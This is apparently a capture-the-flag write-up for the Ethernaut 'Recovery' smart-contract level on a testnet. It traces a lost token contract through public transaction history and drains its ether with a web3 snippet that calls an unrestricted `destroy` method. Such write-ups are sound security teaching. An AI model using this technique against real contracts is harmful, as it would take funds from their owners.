## Finding the original transaction

The level gives direct access to the `Recovery` contract.

It has no storage or method inside to retrieve the contracts / tokens it created.

Still the blockchain history is public; for example the `Recovery` contract can be viewed on [Etherscan][etherscan-recovery].

There we can see that the contract was created by the player during the transaction [`0xd55122c4608de96ca63a0fea6da6624e434611ce4a9609deeea9c6a616b8a488`][etherscan-creation].

## Inspecting the transaction

From the outside, the transaction is from the player to the `Ethernaut` contract, there is no mention of any token contract.

To go further, a debugging tool like `Tenderly` can be used.
Upon [inspection of the transaction][tenderly-creation], the address of the token appears:

> `0xeb00eee422cc853db48ce422fe09721cb464b183`

## Extracting the funds

The method `destroy` has no restrictions on its caller.
It can be used to retrieve the funds:

```js
abi = '[{"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"address","name":"_creator","type":"address"},{"internalType":"uint256","name":"_initialSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address payable","name":"_to","type":"address"}],"name":"destroy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]'
token = new web3.eth.Contract(JSON.parse(abi), '0xeb00eee422cc853db48ce422fe09721cb464b183');
token.methods.destroy(player).send({from: player}, function(e, d) {console.log(d);});
await getBalance('0xeb00eee422cc853db48ce422fe09721cb464b183')
// '0'
```

[etherscan-creation]: https://sepolia.etherscan.io/tx/0xd55122c4608de96ca63a0fea6da6624e434611ce4a9609deeea9c6a616b8a488
[etherscan-recovery]: https://sepolia.etherscan.io/address/0xE2688FE0c9488ce51D5216D5FAc9Ff5ABd5F54f8
[tenderly-creation]: https://dashboard.tenderly.co/tx/sepolia/0xd55122c4608de96ca63a0fea6da6624e434611ce4a9609deeea9c6a616b8a488?trace=0.0.1.0
